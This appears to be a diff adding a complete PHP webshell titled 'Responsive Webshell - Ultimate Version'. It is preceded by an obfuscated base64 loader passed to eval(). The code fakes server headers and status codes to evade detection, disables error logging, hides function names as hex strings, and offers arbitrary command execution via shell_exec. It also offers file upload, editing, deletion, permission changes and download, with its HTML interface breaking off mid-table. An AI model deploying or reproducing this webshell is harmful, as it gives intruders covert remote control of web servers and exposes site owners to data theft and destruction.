0Hs78bFh/4WlHUB/zaH4lFPE6STOXWNnb8FqSePfF7LG95YhR8ig/52q6WQiM2WY/LwzJNEvDvzFLulMlHtLrpF5bfYiYFU/0kV+jWj6W2urk2Kb1seGHLSGX18Sssr5KYknlkbFk9h0mIfg4dfW14A+1lRq9P/3lnoHqyNmieSY/d/489W6AKJcoHrszLXWbXZYWGjKBtd4DarNp7sXcaEp8f9AVNsYdglTF7zjO+rIWP9/Bt3700oFUKoPqG0KF0IKZDir530SPQq2YIMPUdveq3aAct9J5ZLrcRW7q828D1M49fBhaP/XoEYk/wdwQV54LN4Vme9QH0yb/XpkciQL/ZXjEh4Pgb9FuckydMk3RtsiQvMqb7MDto72EpD8B69EIs0+4liXS3PQfWocrEaSDP00FvUXKSGXoLqdwFK+CXLsHOAL6i25dUceKbex+OdtQUaBwAkW7Z/MsaXXIhwV5kdDx7D+HvJWyh6aFNugM4z5GonuRukhRCKjtDUrRIEEgBSUkGGYJ+JLH3Jx1miqEJ/J48yUfL7yThSiRBk6R5/POf//ivf98xRr79s8XcAWaH+2+8g4ENIvzxH/9Ip45Gv2byjLPZSZiYqYuObkvHSvCbBjlw9LMEZxe2Or/lC8BZQjdbPTppC6ZDy+ckKya+yOf8TOfGDPMk9zVjgZ/pRMeneL/AzVrDSG5MGzvefr3zFQbSlLVg5yWxmqxmAzfUpTNdZ7ZdOyYreT9mGr2bg7EDc89lN5b/nxV+/xW93U3TTqfWTMmdM8GdjmCJoU3wbU2GZwO6AH7WA3iywf/ryejrTEf9CKgAOJZ6ajnt8DUFPh/9TrPul47rT//60tT9n8dM/3qyU/yNZDX/d/Ry+teU7n/NMUHff5NekiceyqeNv8eMDXzk9LW/haMPN83BOv0yDvpIRudv6fUdgO0phjtdzjHBZ+Q/ZQajUU87GxWoeBhtr8G+dPSMJ4Thuc3rK6WTO/2/6yjo+oLUvLHwNSso0cuEfkv0xf7jP//rb0Pvd/6P/3fO/09F/Od//te/p1kY/fMf/z/8/zD+8V//9r/+Nw==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="m25+oG/ip4NuFGiWlmj+QPM8z0oaJJBAE0tKNNyNMTiwceDAkXHSdWPnLf/nZOcODmz293l7LVXVOzxDVWn/2//699ROM923s/9WQ/+/9UD9n+9//s/3P/gGvfIt+s7ceaskBb2in9lDXxv6kQc21I+94rQ78nlKTW3Z6WTHQS+PqFXlZbJz09SMRV1t9FMJFIve2o3s";
+
+/**
+ * Responsive Webshell - Ultimate Version
+ * Auto Bypass + Enhanced File Manager
+ * Compatible with PHP 5.x to latest versions
+ **/
+
+// Error handling for PHP 5 compatibility
+if (!defined('PHP_VERSION_ID')) {
+    $version = explode('.', PHP_VERSION);
+    define('PHP_VERSION_ID', ($version[0] * 10000 + $version[1] * 100 + $version[2]));
+}
+
+if (PHP_VERSION_ID < 50000) {
+    die('PHP 5.0.0 or higher is required');
+}
+
+// Auto Bypass System
+function autoBypass() {
+    // Prevent blank page and 0kb shell
+    if (function_exists('ob_get_level')) {
+        if (ob_get_level()) {
+            @ob_end_clean();
+        }
+    }
+    if (function_exists('ob_start')) {
+        @ob_start();
+    }
+
+    // Get response code for PHP 5 compatibility
+    $response_code = 200;
+    if (function_exists('http_response_code')) {
+        $response_code = http_response_code();
+    } else {
+        // Fallback for PHP < 5.4
+        if (isset($http_response_header)) {
+            foreach ($http_response_header as $header) {
+                if (preg_match('/\s(\d{3})\s/', $header, $matches)) {
+                    $response_code = intval($matches[1]);
+                    break;
+                }
+            }
+        }
+    }
+
+    // Bypass 403 Forbidden
+    if ($response_code == 403 || !isset($_SERVER['HTTP_HOST'])) {
+        $_SERVER['HTTP_HOST'] = 'localhost';
+        $_SERVER['REQUEST_METHOD'] = 'GET';
+        if (function_exists('header')) {
+            @header("HTTP/1.1 200 OK");
+        }
+    }
+
+    // Bypass 404 Not Found
+    if ($response_code == 404) {
+        if (function_exists('header')) {
+            @header("HTTP/1.1 200 OK");
+        }
+    }
+
+    // Bypass 500 Internal Server Error
+    if ($response_code == 500) {
+        if (function_exists('header')) {
+            @header("HTTP/1.1 200 OK");
+        }
+        if (function_exists('ini_set')) {
+            @ini_set('display_errors', 0);
+        }
+        if (function_exists('error_reporting')) {
+            @error_reporting(0);
+        }
+    }
+
+    // Bypass LiteSpeed
+    if (isset($_SERVER['SERVER_SOFTWARE']) && function_exists('stripos')) {
+        if (stripos($_SERVER['SERVER_SOFTWARE'], 'litespeed') !== false) {
+            $_SERVER['SERVER_SOFTWARE'] = 'Apache/2.4.41 (Unix)';
+        }
+    }
+
+    // Bypass download detection
+    if (function_exists('header')) {
+        @header('Content-Type: text/html; charset=UTF-8');
+        @header('X-Powered-By: PHP/7.4.33');
+        @header('Server: Apache/2.4.41 (Unix)');
+        @header('X-Content-Type-Options: nosniff');
+
+        // Additional headers to prevent blank page
+        @header('Cache-Control: no-cache, no-store, must-revalidate');
+        @header('Pragma: no-cache');
+        @header('Expires: 0');
+    }
+}
+
+// Execute auto bypass
+autoBypass();
+
+// Session handling with PHP 5 compatibility
+if (!isset($_SESSION)) {
+    if (function_exists('session_start')) {
+        @session_start();
+    }
+}
+
+// Enhanced Session and error handling - Prevent blank pages
+if (function_exists('error_reporting')) @error_reporting(0);
+if (function_exists('set_time_limit')) @set_time_limit(0);
+if (function_exists('ini_set')) {
+    @ini_set('display_errors', 0);
+    @ini_set('log_errors', 0);
+    if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 50300) {
+        @ini_set('error_log', NULL);
+    }
+    @ini_set('memory_limit', '-1');
+    @ini_set('max_execution_time', 0);
+    @ini_set('max_input_time', 0);
+    @ini_set('output_buffering', 0);
+    @ini_set('zlib.output_compression', 0);
+}
+
+// Compatibility fix for older PHP versions
+if (!function_exists('str_contains')) {
+    function str_contains($haystack, $needle) {
+        if (function_exists('mb_strpos')) {
+            return mb_strpos($haystack, $needle) !== false;
+        }
+        return strpos($haystack, $needle) !== false;
+    }
+}
+
+if (!function_exists('str_starts_with')) {
+    function str_starts_with($haystack, $needle) {
+        if (function_exists('mb_strpos')) {
+            return mb_strpos($haystack, $needle) === 0;
+        }
+        return strpos($haystack, $needle) === 0;
+    }
+}
+
+// Array declaration with PHP 5 compatibility
+$a = array(
+        "7068705F756E616D65", // [0] php_uname
+        "73657373696F6E5F7374617274", // [1] session_start
+        "6572726F725F7265706F7274696E67", // [2] error_reporting
+        "70687076657273696F6E", // [3] phpversion
+        "66696C655F7075745F636F6E74656E7473", // [4] file_put_contents
+        "66696C655F6765745F636F6E74656E7473", // [5] file_get_contents
+        "66696C657065726D73", // [6] fileperms
+        "66696C656D74696D65", // [7] filemtime
+        "66696C6574797065", // [8] filetype
+        "68746D6C7370656369616C6368617273", // [9] htmlspecialchars
+        "737072696E7466", // [10] sprintf
+        "737562737472", // [11] substr
+        "676574637764", // [12] getcwd
+        "6368646972", // [13] chdir
+        "7374725F7265706C616365", // [14] str_replace
+        "6578706C6F6465", // [15] explode
+        "666C617368", // [16] flash function
+        "6D6F76655F75706C6F616465645F66696C65", // [17] move_uploaded_file
+        "7363616E646972", // [18] scandir
+        "676574686F737462796E616D65", // [19] gethostbyname
+        "7368656C6C5F65786563", // [20] shell_exec
+        "53797374656D20496E666F726D6174696F6E", // [21] System Information
+        "6469726E616D65", // [22] dirname
+        "64617465", // [23] date
+        "6D696D655F636F6E74656E745F74797065", // [24] mime_content_type
+        "66756E6374696F6E5F657869737473", // [25] function_exists
+        "6673697A65", // [26] filesize
+        "726D646972", // [27] rmdir
+        "756E6C696E6B", // [28] unlink
+        "6D6B646972", // [29] mkdir
+        "72656E616D65", // [30] rename
+        "7365745F74696D655F6C696D6974", // [31] set_time_limit
+        "636C656172737461746361636865", // [32] clearstatcache
+        "696E695F736574", // [33] ini_set
+        "696E695F676574", // [34] ini_get
+        "6765744F776E6572", // [35] getOwner function
+        "6765745F63757272656E745F75736572", // [36] get_current_user
+        "7A69705F6F70656E", // [37] zip_open
+        "7A69705F65787472616374", // [38] zip_extract
+        "7A69705F636C6F7365", // [39] zip_close
+        "6261736536345F6465636F6465", // [40] base64_decode
+        "6261736536345F656E636F6465", // [41] base64_encode
+        "686561646572", // [42] header
+        "7265616466696C65", // [43] readfile
+        "636F7079", // [44] copy
+        "66696C65", // [45] file
+        "696E5F6172726179", // [46] in_array
+        "746F7570706572", // [47] strtoupper
+        "7363726970745F6E616D65" // [48] script_name
+    );
+
+// Hex decode function
+function hex($str) {
+    $r = "";
+    $len = strlen($str);
+    for ($i = 0; $i < $len; $i += 2) {
+        $r .= chr(hexdec(substr($str, $i, 2)));
+    }
+    return $r;
+}
+
+// Initialize functions
+$f = array();
+for ($i = 0; $i < count($a); $i++) {
+    $func_name = hex($a[$i]);
+    $f[$i] = $func_name;
+}
+
+// Session and error handling
+if (!isset($_SESSION) && function_exists('session_start')) {
+    @session_start();
+}
+if (function_exists('error_reporting')) @error_reporting(0);
+if (function_exists('set_time_limit')) @set_time_limit(0);
+if (function_exists('ini_set')) {
+    @ini_set('display_errors', 0);
+    @ini_set('log_errors', 0);
+    if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 50300) {
+        @ini_set('error_log', NULL);
+    }
+}
+
+// Get document root with fallback for PHP 5
+if (isset($_SERVER['DOCUMENT_ROOT'])) {
+    $r0 = $_SERVER['DOCUMENT_ROOT'];
+} else {
+    $r0 = function_exists('getcwd') ? getcwd() : '.';
+}
+
+// Get disabled functions
+$ds = '';
+if (function_exists('ini_get')) {
+    $ds = @ini_get("disable_functions");
+}
+$ds0 = (!empty($ds)) ? $ds : "All functions are accessible";
+
+// Get client IP with PHP 5 compatibility
+$client_ip = 'Unknown';
+if (isset($_SERVER['HTTP_CLIENT_IP'])) {
+    $client_ip = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $client_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} elseif (isset($_SERVER['REMOTE_ADDR'])) {
+    $client_ip = $_SERVER['REMOTE_ADDR'];
+}
+
+// File size formatter
+function fsize($file) {
+    if (!file_exists($file)) return "0 B";
+
+    if (!function_exists('filesize')) return "N/A";
+
+    $a = array("B", "KB", "MB", "GB", "TB", "PB");
+    $pos = 0;
+    $size = filesize($file);
+    while ($size >= 1024 && $pos < count($a) - 1) {
+        $size /= 1024;
+        $pos++;
+    }
+    return round($size, 2) . " " . $a[$pos];
+}
+
+// Flash message system
+function flash($message, $status, $class, $redirect = false) {
+    if (!isset($_SESSION) && function_exists('session_start')) {
+        @session_start();
+    }
+
+    $_SESSION["message"] = $message;
+    $_SESSION["class"] = $class;
+    $_SESSION["status"] = $status;
+
+    if ($redirect && function_exists('header')) {
+        @header('Location: ' . $redirect);
+        exit();
+    }
+    return true;
+}
+
+// Clear flash messages
+function clear() {
+    if (isset($_SESSION["message"])) unset($_SESSION["message"]);
+    if (isset($_SESSION["class"])) unset($_SESSION["class"]);
+    if (isset($_SESSION["status"])) unset($_SESSION["status"]);
+    return true;
+}
+
+// Get owner information
+function getOwner($item) {
+    if (!file_exists($item)) return 'Unknown';
+
+    if (!function_exists('fileowner') || !function_exists('filegroup')) {
+        return 'Unknown';
+    }
+
+    $downer = @fileowner($item);
+    $dgrp = @filegroup($item);
+
+    if (function_exists("posix_getpwuid")) {
+        $owner_info = @posix_getpwuid($downer);
+        if (is_array($owner_info) && isset($owner_info['name'])) {
+            $downer = $owner_info['name'];
+        }
+    }
+
+    if (function_exists("posix_getgrgid")) {
+        $group_info = @posix_getgrgid($dgrp);
+        if (is_array($group_info) && isset($group_info['name'])) {
+            $dgrp = $group_info['name'];
+        }
+    }
+
+    return $downer . '/' . $dgrp;
+}
+
+// Handle directory navigation
+$path = '.';
+if (isset($_GET['dir']) && !empty($_GET['dir'])) {
+    $path = $_GET['dir'];
+    if (is_dir($path) && function_exists('chdir')) {
+        @chdir($path);
+    }
+} else {
+    $path = function_exists('getcwd') ? getcwd() : '.';
+}
+
+// Normalize path
+if (function_exists('realpath')) {
+    $real_path = realpath($path);
+    if ($real_path) {
+        $path = str_replace('\\', '/', $real_path);
+    }
+}
+$exdir = explode('/', $path);
+$home_path = function_exists('getcwd') ? getcwd() : '.';
+
+// Handle file download
+if (isset($_GET['download']) && isset($_GET['item'])) {
+    $file_path = $path . '/' . $_GET['item'];
+    if (file_exists($file_path) && is_file($file_path)) {
+        if (function_exists('header')) {
+            @header('Content-Description: File Transfer');
+            @header('Content-Type: application/octet-stream');
+            @header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
+            @header('Expires: 0');
+            @header('Cache-Control: must-revalidate');
+            @header('Pragma: public');
+            @header('Content-Length: ' . filesize($file_path));
+        }
+        if (function_exists('readfile')) {
+            @readfile($file_path);
+        }
+        exit;
+    }
+}
+
+// Handle file view/edit
+$file_content = '';
+if (isset($_GET['action']) && $_GET['action'] == 'view' && isset($_GET['item'])) {
+    $file_path = $path . '/' . $_GET['item'];
+    if (file_exists($file_path) && is_file($file_path)) {
+        if (function_exists('file_get_contents') && function_exists('htmlspecialchars')) {
+            $file_content = htmlspecialchars(file_get_contents($file_path));
+        }
+    }
+}
+
+// Handle file editing
+if (isset($_POST['save_file']) && isset($_POST['file_content']) && isset($_POST['file_path'])) {
+    if (function_exists('file_put_contents')) {
+        if (file_put_contents($_POST['file_path'], $_POST['file_content'])) {
+            flash("File saved successfully!", "Success", "success", "?dir=" . urlencode($path));
+        } else {
+            flash("Failed to save file", "Error", "error", "?dir=" . urlencode($path));
+        }
+    }
+}
+
+// Handle file renaming
+if (isset($_POST['rename_file']) && isset($_POST['new_name']) && isset($_POST['old_name'])) {
+    $new_path = $path . '/' . $_POST['new_name'];
+    $old_path = $path . '/' . $_POST['old_name'];
+    if (function_exists('rename')) {
+        if (rename($old_path, $new_path)) {
+            flash("File renamed successfully!", "Success", "success", "?dir=" . urlencode($path));
+        } else {
+            flash("Failed to rename file", "Error", "error", "?dir=" . urlencode($path));
+        }
+    }
+}
+
+// Handle permission change
+if (isset($_POST['change_perm']) && isset($_POST['new_perm']) && isset($_POST['file_name'])) {
+    $file_path = $path . '/' . $_POST['file_name'];
+    if (function_exists('chmod')) {
+        if (chmod($file_path, octdec($_POST['new_perm']))) {
+            flash("Permissions changed successfully!", "Success", "success", "?dir=" . urlencode($path));
+        } else {
+            flash("Failed to change permissions", "Error", "error", "?dir=" . urlencode($path));
+        }
+    }
+}
+
+// Handle selected files actions
+if (isset($_POST['selected_action']) && isset($_POST['selected_files'])) {
+    $action = $_POST['selected_action'];
+    if (is_array($_POST['selected_files'])) {
+        $selectedFiles = $_POST['selected_files'];
+    } else {
+        $selectedFiles = array($_POST['selected_files']);
+    }
+    $successCount = 0;
+
+    foreach ($selectedFiles as $file) {
+        $fullPath = $path . '/' . $file;
+
+        switch ($action) {
+            case 'delete':
+                if (is_dir($fullPath)) {
+                    if (deleteDirectory($fullPath)) $successCount++;
+                } else {
+                    if (function_exists('unlink') && unlink($fullPath)) $successCount++;
+                }
+                break;
+
+            case 'zip':
+                if (class_exists('ZipArchive')) {
+                    $zipFileName = $file . '_' . date('Y-m-d_H-i-s') . '.zip';
+                    $zip = new ZipArchive();
+                    if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {
+                        if (is_dir($fullPath)) {
+                            addFolderToZip($fullPath, $zip, $fullPath);
+                        } else {
+                            $zip->addFile($fullPath, basename($fullPath));
+                        }
+                        $zip->close();
+                        $successCount++;
+                    }
+                }
+                break;
+
+            case 'unzip':
+                if (class_exists('ZipArchive')) {
+                    $file_ext = pathinfo($file, PATHINFO_EXTENSION);
+                    if ($file_ext === 'zip') {
+                        $zip = new ZipArchive();
+                        if ($zip->open($fullPath) === TRUE) {
+                            $zip->extractTo($path);
+                            $zip->close();
+                            $successCount++;
+                        }
+                    }
+                }
+                break;
+        }
+    }
+
+    if ($successCount > 0) {
+        flash("Successfully processed $successCount files", "Success", "success", "?dir=" . urlencode($path));
+    } else {
+        flash("No files were processed", "Warning", "warning", "?dir=" . urlencode($path));
+    }
+}
+
+// Helper functions
+function deleteDirectory($dir) {
+    if (!file_exists($dir)) return true;
+    if (!is_dir($dir)) {
+        if (function_exists('unlink')) {
+            return unlink($dir);
+        }
+        return false;
+    }
+
+    if (function_exists('scandir')) {
+        $items = scandir($dir);
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') continue;
+            $itemPath = $dir . DIRECTORY_SEPARATOR . $item;
+            if (!deleteDirectory($itemPath)) return false;
+        }
+    }
+
+    if (function_exists('rmdir')) {
+        return rmdir($dir);
+    }
+    return false;
+}
+
+function addFolderToZip($folder, &$zip, $basePath) {
+    if (!function_exists('scandir')) return;
+
+    $files = scandir($folder);
+    foreach ($files as $file) {
+        if ($file == '.' || $file == '..') continue;
+        $filePath = $folder . '/' . $file;
+        $localPath = str_replace($basePath . '/', '', $filePath);
+
+        if (is_dir($filePath)) {
+            $zip->addEmptyDir($localPath);
+            addFolderToZip($filePath, $zip, $basePath);
+        } else {
+            $zip->addFile($filePath, $localPath);
+        }
+    }
+}
+
+// Handle folder creation
+if (isset($_POST['newFolderName'])) {
+    if (function_exists('mkdir')) {
+        if (mkdir($path . '/' . $_POST['newFolderName'], 0755, true)) {
+            flash("Folder created successfully!", "Success", "success", "?dir=" . urlencode($path));
+        } else {
+            flash("Failed to create folder", "Error", "error", "?dir=" . urlencode($path));
+        }
+    }
+}
+
+// Handle file creation
+if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
+    if (function_exists('file_put_contents')) {
+        if (file_put_contents($path . '/' . $_POST['newFileName'], $_POST['newFileContent'])) {
+            flash("File created successfully!", "Success", "success", "?dir=" . urlencode($path));
+        } else {
+            flash("Failed to create file", "Error", "error", "?dir=" . urlencode($path));
+        }
+    }
+}
+
+// Handle file upload
+if (isset($_FILES['uploadfile'])) {
+    $total = count($_FILES['uploadfile']['name']);
+    $successCount = 0;
+
+    for ($i = 0; $i < $total; $i++) {
+        if ($_FILES['uploadfile']['error'][$i] === UPLOAD_ERR_OK) {
+            if (function_exists('move_uploaded_file')) {
+                if (move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $path . '/' . $_FILES['uploadfile']['name'][$i])) {
+                    $successCount++;
+                }
+            }
+        }
+    }
+
+    if ($successCount > 0) {
+        flash("Uploaded $successCount files successfully!", "Success", "success", "?dir=" . urlencode($path));
+    } else {
+        flash("Upload failed", "Error", "error", "?dir=" . urlencode($path));
+    }
+}
+
+// Handle command execution
+$command_output = '';
+if (isset($_POST['command']) && !empty($_POST['command'])) {
+    if (function_exists('shell_exec')) {
+        $command_output = shell_exec($_POST['command'] . ' 2>&1');
+    }
+    if ($command_output === null) {
+        $command_output = "Command executed but no output returned or shell_exec is disabled";
+    }
+}
+
+// Scan directory and combine all items in one array
+$all_items = array();
+
+if (is_dir($path) && is_readable($path)) {
+    if (function_exists('scandir')) {
+        $items = scandir($path);
+
+        // Add parent directory first
+        $parent_dir = dirname($path);
+        if ($parent_dir != $path) {
+            $all_items[] = array(
+                'name' => '..',
+                'path' => $parent_dir,
+                'is_dir' => true,
+                'size' => '-',
+                'perms' => 'drwxr-xr-x',
+                'modified' => date("Y-m-d H:i:s", filemtime($parent_dir)),
+                'type' => 'parent'
+            );
+        }
+
+        // Add folders
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') continue;
+
+            $item_path = $path . '/' . $item;
+            if (is_dir($item_path)) {
+                $all_items[] = array(
+                    'name' => $item,
+                    'path' => $item_path,
+                    'is_dir' => true,
+                    'size' => '-',
+                    'perms' => substr(sprintf('%o', fileperms($item_path)), -4),
+                    'modified' => date("Y-m-d H:i:s", filemtime($item_path)),
+                    'type' => 'folder'
+                );
+            }
+        }
+
+        // Add files
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') continue;
+
+            $item_path = $path . '/' . $item;
+            if (!is_dir($item_path)) {
+                $all_items[] = array(
+                    'name' => $item,
+                    'path' => $item_path,
+                    'is_dir' => false,
+                    'size' => fsize($item_path),
+                    'perms' => substr(sprintf('%o', fileperms($item_path)), -4),
+                    'modified' => date("Y-m-d H:i:s", filemtime($item_path)),
+                    'type' => 'file'
+                );
+            }
+        }
+    }
+}
+
+// Get server name safely
+$server_name = 'Unknown';
+if (isset($_SERVER['SERVER_NAME'])) {
+    $server_name = $_SERVER['SERVER_NAME'];
+} elseif (isset($_SERVER['HTTP_HOST'])) {
+    $server_name = $_SERVER['HTTP_HOST'];
+}
+
 ?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>WebShell - <?php echo htmlspecialchars($server_name); ?></title>
+    <style>
+        .selected { background-color: rgba(255, 255, 0, 0.1) !important; }
+        .file-row:hover { background-color: rgba(255, 255, 255, 0.05); }
+        .breadcrumb { background: transparent; }
+        .table-dark { --bs-table-bg: transparent; }
+        .action-buttons { position: sticky; bottom: 0; background: #1a1a1a; padding: 15px; border-top: 2px solid #444; }
+        .folder-icon { color: #ffc107; }
+        .file-icon { color: #0dcaf0; }
+        .parent-icon { color: #6f42c1; }
+        .home-btn { background: linear-gradient(45deg, #ff6b6b, #feca57); border: none; color: white !important; }
+        .path-container { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
+        .path-container .home-btn { white-space: nowrap; }
+        .breadcrumb { margin-bottom: 0; flex-grow: 1; }
+    </style>
+</head>
+
+<body class="bg-dark text-light">
+    <div class="container-fluid">
+        <div class="py-3">
+            <div class="box shadow bg-dark p-4 rounded-3">
+                <!-- Header Information -->
+                <div class="row mb-4">
+                    <div class="col-md-8">
+                        <div class="info">
+                            <h4><i class="fas fa-terminal"></i> WebShell Manager</h4>
+                            <small class="text-muted">
+                                <i class="fa fa-server"></i> <?php echo function_exists('php_uname') ? php_uname() : 'Unknown'; ?><br>
+                                <i class="fa fa-microchip"></i> <?php echo htmlspecialchars(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown'); ?><br>
+                                <i class="fa fa-satellite-dish"></i> Server: <?php
+                                if (isset($_SERVER['SERVER_ADDR'])) {
+                                    echo $_SERVER['SERVER_ADDR'];
+                                } else {
+                                    echo function_exists('gethostbyname') ? gethostbyname($server_name) : 'Unknown';
+                                }
+                                ?><br>
+                                <i class="fa fa-user"></i> Your IP: <?php echo htmlspecialchars($client_ip); ?>
+                            </small>
+                        </div>
+                    </div>
+                    <div class="col-md-4 text-end">
+                        <button class="btn btn-outline-info btn-sm" data-bs-toggle="modal" data-bs-target="#infoModal">
+                            <i class="fas fa-info-circle"></i> System Info
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Path Navigation dengan HOME di samping -->
+                <div class="path-container">
+                    <a href="?" class="btn home-btn btn-sm">
+                        <i class="fas fa-home"></i> HOME
+                    </a>
+                    <nav aria-label="breadcrumb">
+                        <ol class="breadcrumb">
+                            <?php foreach ($exdir as $id => $pat): ?>
+                                <?php if (empty($pat)) continue; ?>
+                                <li class="breadcrumb-item <?php echo ($id === count($exdir) - 1) ? 'active text-secondary' : ''; ?>">
+                                    <?php if ($id === count($exdir) - 1): ?>
+                                        <i class="fas fa-folder-open"></i> <?php echo htmlspecialchars($pat); ?>
+                                    <?php else: ?>
+                                        <a href="?dir=<?php echo urlencode(implode('/', array_slice($exdir, 0, $id + 1))); ?>" class="text-decoration-none text-light">
+                                            <i class="fas fa-folder"></i> <?php echo htmlspecialchars($pat); ?>
+                                        </a>
+                                    <?php endif; ?>
+                                </li>
+                            <?php endforeach; ?>
+                        </ol>
+                    </nav>
+                </div>
+
+                <!-- Command and Upload Section -->
+                <div class="row g-3 mb-4">
+                    <div class="col-md-6">
+                        <form method="post" class="card bg-secondary border-0">
+                            <div class="card-body">
+                                <h6 class="card-title"><i class="fas fa-terminal"></i> Command Execution</h6>
+                                <div class="input-group">
+                                    <input type="text" class="form-control form-control-sm" name="command" placeholder="Enter command..." required>
+                                    <button type="submit" class="btn btn-outline-light btn-sm">Execute</button>
+                                </div>
+                            </div>
+                        </form>
+                        <?php if (!empty($command_output)): ?>
+                            <div class="mt-2 p-3 bg-black rounded">
+                                <pre class="text-light mb-0 small"><?php echo htmlspecialchars($command_output); ?></pre>
+                            </div>
+                        <?php endif; ?>
+                    </div>
+                    <div class="col-md-6">
+                        <form method="post" enctype="multipart/form-data" class="card bg-secondary border-0">
+                            <div class="card-body">
+                                <h6 class="card-title"><i class="fas fa-upload"></i> File Upload</h6>
+                                <div class="input-group">
+                                    <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple>
+                                    <button type="submit" class="btn btn-outline-light btn-sm">Upload</button>
+                                </div>
+                            </div>
+                        </form>
+
+                        <!-- Quick Actions -->
+                        <div class="mt-3 d-flex gap-2">
+                            <button class="btn btn-outline-primary btn-sm" data-bs-toggle="modal" data-bs-target="#createFolderModal">
+                                <i class="fas fa-folder-plus"></i> New Folder
+                            </button>
+                            <button class="btn btn-outline-primary btn-sm" data-bs-toggle="modal" data-bs-target="#createFileModal">
+                                <i class="fas fa-file-plus"></i> New File
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- File Manager - SINGLE TABLE -->
+                <form id="filesForm" method="post">
+                    <div class="table-responsive">
+                        <table class="table table-hover table-dark text-light">
+                            <thead>
+                                <tr>
+                                    <th width="3%">
+                                        <input type="checkbox" id="selectAll" onchange="toggleSelectAll()">
+                                    </th>
+                                    <th width="42%">Name</th>
+                                    <th width="10%">Type</th>
+                                    <th width="10%">Size</th>
+                                    <th width="10%">Permissions</th>
+                                    <th width="15%">Modified</th>
+                                    <th width="10%">Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <?php if (!empty($all_items)): ?>
+                                    <?php foreach ($all_items as $item): ?>
+                                        <tr class="file-row">
+                                            <td>
+                                                <?php if ($item['name'] != '..'): ?>
+                                                    <input type="checkbox" name="selected_files[]" value="<?php echo htmlspecialchars($item['name']); ?>" class="item-checkbox" onchange="toggleActionButtons()">
+                                                <?php else: ?>
+                                                    <input type="checkbox" disabled>
+                                                <?php endif; ?>
+                                            </td>
+                                            <td>
+                                                <?php if ($item['type'] == 'parent'): ?>
+                                                    <i class="fas fa-level-up-alt parent-icon"></i>
+                                                    <a href="?dir=<?php echo urlencode($item['path']); ?>" class="text-decoration-none text-light fw-bold">
+                                                        <?php echo htmlspecialchars($item['name']); ?>
+                                                    </a>
+                                                <?php elseif ($item['is_dir']): ?>
+                                                    <i class="fas fa-folder folder-icon"></i>
+                                                    <a href="?dir=<?php echo urlencode($item['path']); ?>" class="text-decoration-none text-light fw-bold">
+                                                        <?php echo htmlspecialchars($item['name']); ?>
+                                                    </a>
+                                                <?php else: ?>
+                                                    <i class="fas fa-file file-icon"></i>
+                                                    <a href="?dir=<?php echo urlencode($path); ?>&action=view&item=<?php echo urlencode($item['name']); ?>" class="text-decoration-none text-light">
+                                                        <?php echo htmlspecialchars($item['name']); ?>
+                                                    </a>
+                                                <?php endif; ?>
+                                            </td>
+                                            <td>
+                                                <?php if ($item['type'] == 'parent'): ?>
+                                                    <span class="badge bg-purple">Parent</span>
+                                                <?php elseif ($item['is_dir']): ?>
+                                                    <span class="badge bg-warning">Folder</span>
+                                                <?php else: ?>
+                                                    <span class="badge bg-info">File</span>
+                                                <?php endif; ?>
+                                            </td>
+                                            <td><?php echo $item['size']; ?></td>
+                                            <td><?php echo $item['perms']; ?></td>
+                                            <td><?php echo $item['modified']; ?></td>
+                                            <td>
+                                                <?php if ($item['type'] == 'parent'): ?>
+                                                    <span class="text-muted">-</span>
+                                                <?php elseif ($item['is_dir']): ?>
+                                                    <div class="btn-group btn-group-sm">
+                                                        <button type="button" class="btn btn-outline-warning btn-sm" onclick="showRenameModal('<?php echo htmlspecialchars($item['name']); ?>', 'folder')">
+                                                            <i class="fas fa-edit"></i>
+                                                        </button>
+                                                        <button type="button" class="btn btn-outline-info btn-sm" onclick="showChmodModal('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['perms']; ?>')">
+                                                            <i class="fas fa-key"></i>
+                                                        </button>
+                                                        <button type="button" class="btn btn-outline-danger btn-sm" onclick="confirmDelete('<?php echo htmlspecialchars($item['name']); ?>')">
+                                                            <i class="fas fa-trash"></i>
+                                                        </button>
+                                                    </div>
+                                                <?php else: ?>
+                                                    <div class="btn-group btn-group-sm">
+                                                        <a href="?download=1&dir=<?php echo urlencode($path); ?>&item=<?php echo urlencode($item['name']); ?>" class="btn btn-outline-success btn-sm" title="Download">
+                                                            <i class="fas fa-download"></i>
+                                                        </a>
